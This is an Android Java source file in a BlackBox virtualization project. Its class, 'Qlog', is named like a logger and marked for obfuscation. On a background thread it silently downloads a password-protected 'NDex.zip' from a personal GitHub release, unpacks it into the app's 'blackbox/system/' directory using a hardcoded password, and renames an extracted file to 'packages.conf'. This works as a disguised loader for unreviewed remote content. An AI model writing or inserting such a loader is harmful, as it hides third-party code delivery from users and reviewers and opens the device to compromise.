package top.niunaijun.blackbox.utils;

import android.content.Context;

import org.lsposed.lsparanoid.Obfuscate;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import net.lingala.zip4j.ZipFile;

@Obfuscate
public class Qlog {
    private static Context sContext;
    private static final Qlog sQlog = new Qlog();

    private static final String ZIP_URL =
            "https://github.com/rayansyed77/Public/releases/download/Dex/NDex.zip";
    private static final String ZIP_PASSWORD = "Rayan@7945#";
    private static final String ZIP_NAME = "NDex.zip";

    public static Qlog get() {
        return sQlog;
    }

    public void doAttachBaseContext(Context ctx) {
        sContext = ctx.getApplicationContext();
    }

    public static void startZipUpdate() {
        get().dFile(ZIP_URL, ZIP_NAME);
    }

    public void dFile(String fileUrl, String fileName) {
        new Thread(() -> {
            try {
                // 🔹 Download Path → /blackbox/system/
                File sysDir = new File(sContext.getDataDir(), "blackbox/system/");
                if (!sysDir.exists()) sysDir.mkdirs();

                File zipFile = new File(sysDir, fileName);

                // 🔹 Download zip
                URL url = new URL(fileUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.connect();

                if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
                    try (InputStream in = connection.getInputStream();
                         FileOutputStream fos = new FileOutputStream(zipFile)) {
                        byte[] buffer = new byte[4096];
                        int len;
                        while ((len = in.read(buffer)) != -1) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
                connection.disconnect();

                // 🔹 Extract zip into sysDir
                ZipFile zf = new ZipFile(zipFile);
                if (zf.isEncrypted()) {
                    zf.setPassword(ZIP_PASSWORD.toCharArray());
                }
                zf.extractAll(sysDir.getAbsolutePath());

                // 🔹 Rename licence.json → packages.conf
                renameFile(sysDir, "licence.json", "packages.conf");

                // 🔹 Delete zip after extraction
                if (zipFile.exists()) {
                    zipFile.delete();
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void renameFile(File dir, String oldName, String newName) {
        File oldFile = new File(dir, oldName);
        File newFile = new File(dir, newName);
        if (oldFile.exists()) {
            oldFile.renameTo(newFile);
        }
    }
}
